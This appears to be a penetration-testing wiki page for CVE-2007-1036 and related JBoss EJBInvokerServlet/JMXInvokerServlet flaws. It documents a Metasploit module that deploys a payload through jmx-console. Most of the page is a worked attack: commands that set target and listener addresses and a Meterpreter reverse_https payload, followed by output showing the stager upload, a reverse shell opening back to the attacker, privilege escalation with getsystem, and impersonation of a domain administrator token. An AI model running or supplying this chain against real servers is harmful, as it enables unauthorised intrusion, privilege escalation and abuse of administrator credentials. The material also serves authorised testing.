icon:fontawesome/solid/unlock-keyhole

# CVE-2007-1036

Apache Tomcat / JBoss EJBInvokerServlet / JMXInvokerServlet Multiple Vulnerabilities

- CVE-2007-1036
- CVE-2012-0874
- CVE-2013-4810

This module can be used to execute a payload on JBoss servers that have an exposed "jmx-console" application. The payload is put on the server by using the jboss.system:MainDeployer functionality. To accomplish this, a temporary HTTP server is created to serve a WAR archive containing our payload. This method will only work if the target server allows outbound connections to us.

## Usage

```bash
msf5 use exploit/multi/http/jboss_invoke_deploy
```

## Examples

```bash
msf5 use exploit/multi/http/jboss_invoke_deploy
msf5 exploit(multi/http/jboss_invoke_deploy) > SET RHOSTS 10.10.10.10
msf5 exploit(multi/http/jboss_invoke_deploy) > SET RHPORT 8180
msf5 exploit(multi/http/jboss_invoke_deploy) > SET PAYLOAD windows/meterpreter/reverse_https
msf5 exploit(multi/http/jboss_invoke_deploy) > SET LHOST 10.10.10.1
msf5 exploit(multi/http/jboss_invoke_deploy) > SET LPORT 8443
msf5 exploit(multi/http/jboss_invoke_deploy) > run

[*] Started HTTPS reverse handler on https://10.10.10.1:8443
[*] Using manually select target: "Windows Universal"
[*] Deploying stager
[*] Calling stager: /EnyMtdpsHwfYUU/idIzmUiHUjmzdC.jsp
[*] Uploading payload through stager
[*] Calling payload: /BiAbpcPbeQku/MAhczELmEptIOJe.jsp
[*] Removing payload through stager
[*] Removing stager
[*] https://10.10.10.1:8443 handling request from 10.10.10.10; (UUID: 4goaaaae) Staging x86 payload (177241 bytes) ...
[*] Meterpreter session 1 opened (10.10.10.1:8443 -> 10.10.10.10:50537) at 1970-01-01 00:01:00 +0200

meterpreter > getsystem
...got system (via technique 1).
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
offsec.nl\adm-JohnDo

meterpreter > impersonate_token offsec.nl\adm-JohnDo
[+] Delegation token available
[+] Successfully impersonated user offsec.nl\adm-JohnDo
meterpreter > getuid
Server username: offsec.nl\adm-JohnDo
```

## References

- [Nessus.org](http://www.nessus.org/u?74979c27)
- [Tenable.com - ID 70414](https://www.tenable.com/plugins/nessus/70414)
